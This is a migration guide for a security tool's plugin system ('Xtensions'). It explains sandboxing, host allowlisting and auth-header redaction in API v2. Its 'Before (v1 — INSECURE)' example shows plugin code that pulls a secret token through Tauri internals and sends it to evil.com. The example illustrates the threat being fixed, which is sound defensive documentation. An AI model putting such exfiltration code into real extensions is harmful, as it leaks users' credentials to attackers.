# Xtension API v2 Migration Guide

**VAAST 0.3.2** introduces a secure execution model for Xtensions. All new Xtensions must use **API version 2**. API v1 Xtensions will be refused at load time.

---

## What Changed

### 1. Isolated Execution (Sandboxed)

**Before (v1)**: Xtensions ran in the main window with full DOM/Tauri access. Could call `__TAURI_INTERNALS__` directly and bypass security.

**After (v2)**: Xtensions run in a sandboxed iframe (no same-origin). All API calls go through a postMessage bridge. **No access** to:
- `__TAURI_INTERNALS__`
- `__TAURI__`
- Parent window DOM
- Tauri commands (except via the provided `api` object)

**Impact**: If your Xtension accessed Tauri commands directly, window objects, or parent DOM, it will break. Use only the provided `api` surface.

---

### 2. Network Restrictions (Host Allowlisting)

**Before (v1)**: `api.http.fetch()` could reach **any host** (data exfiltration + SSRF risk).

**After (v2)**: Rust enforces host allowlisting:
- `api.http.fetch(url)` is **blocked** unless the URL's host is in:
  - `permitted_hosts` (declared in manifest)
  - Verified target domains (from VAAST workspaces)
- Loopback (127.0.0.1), RFC1918 (10.x, 192.168.x), link-local, CGNAT, and cloud metadata (169.254.169.254) are **blocked** by default

**New manifest field**: `permitted_hosts` (array of domains)

```json
{
  "id": "my-xtension",
  "api_version": 2,
  "permissions": ["http.fetch"],
  "permitted_hosts": ["api.openai.com", "api.anthropic.com"]
}
```

**If your Xtension only fetches user-provided target URLs** (from VAAST session), set `permitted_hosts: []` — verified targets are allowed automatically.

---

### 3. Capture Filtering (`api.proxy.getCaptures()`)

**Before (v1)**: Returned **all intercepted requests** with full headers (Cookie, Authorization, etc.).

**After (v2)**: Rust filters in two stages:
1. **Host filtering**: Only returns captures from **verified target domains**
2. **Header redaction**: Strips `Cookie`, `Authorization`, `Set-Cookie`, `Proxy-Authorization` **unless** you declare `captures:sensitive` permission AND the user approves at install

**New permission**: `captures:sensitive` (requires user consent at install)

```json
{
  "permissions": ["proxy.read", "captures:sensitive"]
}
```

**If your Xtension analyzes request patterns but doesn't need auth tokens**, omit `captures:sensitive` — you'll get redacted captures.

---

### 4. CSP Change (No `unsafe-eval`)

**Before (v1)**: Bundles loaded via `new Function()` (required CSP `unsafe-eval`).

**After (v2)**: Bundles execute in sandboxed iframe. Main window CSP no longer allows `unsafe-eval`.

**Impact**: None for Xtensions (they run in iframe). But if your build process generates code that relies on `eval()`, it won't load. Use standard ES modules.

---

## Migration Checklist

### Step 1: Update `manifest.json`

Add `api_version: 2`:

```json
{
  "id": "my-xtension",
  "name": "My Xtension",
  "version": "1.0.0",
  "api_version": 2,
  "permissions": ["proxy.read", "scanner.write", "ui.tab"],
  "entrypoint": "dist/index.js"
}
```

If you use `http.fetch`, add `permitted_hosts`:

```json
{
  "api_version": 2,
  "permissions": ["http.fetch"],
  "permitted_hosts": ["api.example.com"]
}
```

If you need unredacted auth headers from captures, add `captures:sensitive`:

```json
{
  "api_version": 2,
  "permissions": ["proxy.read", "captures:sensitive"]
}
```

---

### Step 2: Remove Direct Tauri/Window Access

**Before (v1 — BROKEN)**:
```typescript
// Direct Tauri invoke (FAILS in v2)
window.__TAURI_INTERNALS__.invoke('some_command', {});

// Direct window access (FAILS in v2)
window.parent.document.querySelector('#target');
```

**After (v2 — WORKS)**:
```typescript
// Use the provided api object
api.scanner.addFinding({ ... });
api.http.fetch('https://example.com');
api.shell.open('https://xtrinel.com');
```

---

### Step 3: Test in Sandbox

Build your Xtension and test in VAAST 0.3.2+. Check:
- ✅ Loads without errors (no `__TAURI__` undefined errors)
- ✅ UI renders correctly (no parent DOM assumptions)
- ✅ `api.http.fetch()` reaches declared hosts (no "Host validation failed" errors)
- ✅ `api.proxy.getCaptures()` returns captures (filtered to verified targets)

**If you get errors**:
- `"Host validation failed"` → Add the host to `permitted_hosts` or ensure it's a verified target in VAAST
- `"__TAURI__ is not defined"` → Remove direct Tauri access, use `api` object only
- UI missing → Your render function tried to access parent DOM; render only inside the provided `container`

---

### Step 4: Update Registry Manifest

For **community Xtensions**: Update your manifest in `xtension-registry/registry/community/<your-id>.json` with:
- `api_version: 2`
- `permitted_hosts: [...]` (if you use `http.fetch`)
- Bump `version` if you changed code

Open a PR. Maintainers will re-review for v2 compliance.

For **official Sentrinels**: Maintainers will update + rebuild.

---

## API Surface (No Changes)

The `api` object is **identical** in v1 and v2. Only the execution environment changed.

```typescript
api.proxy.getCaptures(): Promise<Capture[]>
api.proxy.sendRequest(url, method, headers, body?): Promise<Response>
api.scanner.addFinding(finding): Promise<void>
api.scanner.getFindings(): Promise<Finding[]>
api.logger.getLogs(): Promise<Log[]>
api.shell.open(url): Promise<void>
api.http.fetch(url): Promise<{ status, headers, body }>
api.ui.registerTab(id, label, renderFn?)
api.ui.registerPanel(id, label, renderFn?)
api.session.getMeta(): Promise<{ xtensionId }>
api.session.getVerifiedDomains(): Promise<string[]>
```

---

## Before/After Example

### Before (v1 — INSECURE)

```typescript
export function register(api: any) {
  // Direct Tauri access (bypasses security)
  const token = window.__TAURI_INTERNALS__.invoke('get_secret_token', {});
  
  // Fetch to arbitrary host (data exfiltration)
  api.http.fetch('https://evil.com/exfil?data=' + token);
  
  // Access parent DOM (breaks isolation)
  window.parent.document.title = 'Pwned';
}
```

### After (v2 — SECURE)

```typescript
export function register(api: any) {
  // No __TAURI_INTERNALS__ access (sandboxed)
  // api.http.fetch() only reaches permitted_hosts + verified targets
  // No parent DOM access
  
  api.ui.registerTab('my-tab', 'My Tool', (container) => {
    container.innerHTML = '<h1>Secure Xtension</h1>';
    
    // Fetch only to verified targets or permitted_hosts
    api.http.fetch('https://verified-target.com/api').then(resp => {
      container.innerHTML += `<pre>${resp.body}</pre>`;
    });
  });
}
```

---

## FAQ

### Q: Why was this needed?

**A**: API v1 had no sandboxing. One malicious community Xtension could:
- Steal intercepted auth tokens via `api.proxy.getCaptures()`
- Exfiltrate to any host via `api.http.fetch()`
- Invoke any Tauri command via `__TAURI_INTERNALS__`

API v2 isolates Xtensions and enforces Rust-side permission checks.

---

### Q: My Xtension only needs to analyze captures, not auth headers. Do I need `captures:sensitive`?

**A**: **No**. Omit it. You'll get captures with redacted headers, which is fine for pattern analysis, anomaly detection, or behavior forensics.

---

### Q: I fetch multiple external APIs (OpenAI, Anthropic, etc.). Do I list them all in `permitted_hosts`?

**A**: **Yes**. List every host you call. Example:

```json
{
  "permitted_hosts": ["api.openai.com", "api.anthropic.com", "api.cohere.ai"]
}
```

**Users will see this list at install**. If you fetch undisclosed hosts, your Xtension will be rejected during review.

---

### Q: I'm a community author. When do I need to migrate?

**A**: **Before VAAST 0.3.2 ships**. After that release, v1 Xtensions won't load. Update your manifest + test ASAP.

---

### Q: I'm using Mezo or a Sentrinel. Do I need to do anything?

**A**: **No**. Official Sentrinels and Mezo will be updated by maintainers. You'll auto-update when you next open VAAST.

---

## Support

Questions? Open an issue in the [xtension-registry](https://github.com/Xtrinel-Group/xtension-registry) or ping in Slack.

**Migration deadline**: Before VAAST 0.3.2 GA (TBD).

---

**End of Migration Guide**
